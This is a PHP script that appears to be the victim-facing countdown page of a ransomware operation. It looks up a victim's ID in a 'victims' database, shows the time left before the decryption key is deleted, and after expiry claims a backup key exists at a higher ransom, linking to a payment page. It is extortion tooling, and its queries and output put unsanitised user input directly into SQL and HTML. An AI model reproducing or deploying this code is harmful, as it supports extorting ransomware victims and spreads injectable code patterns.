<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $uniqueID = $_GET['unique_id'];

   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) {
            if ($row['time_left'] < "00:00:01") {
               $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$uniqueID\"";
               $result1 = $conn->query($sql1);

               if ($result1->num_rows >= 0) {
                  echo "<center>";
                  echo "<font color=\"red\">";
                  echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
                  echo "<br /><br /><br />";
                  echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
                  echo "</font>";
                  echo "<a href=\"/payment.php?unique_id=$uniqueID\"><input type=\"submit\" value=\"Pay Here\"></a>";
                  echo "</center>";
               }
            } else {
               echo "<center><font color='red'>";
               echo "<h1>Time Remaining for $uniqueID: " . $row['time_left'] . "</h1><br /><br />";
               echo "<a href=\"/payment.php?unique_id=$uniqueID\"><input type=\"submit\" value=\"Pay Here\"></a>";
               echo "</font></center>";
            }
      }
   } else {
        echo "<br />Could not determine the time left!</br>";
   }  
}

$conn->close();

?>
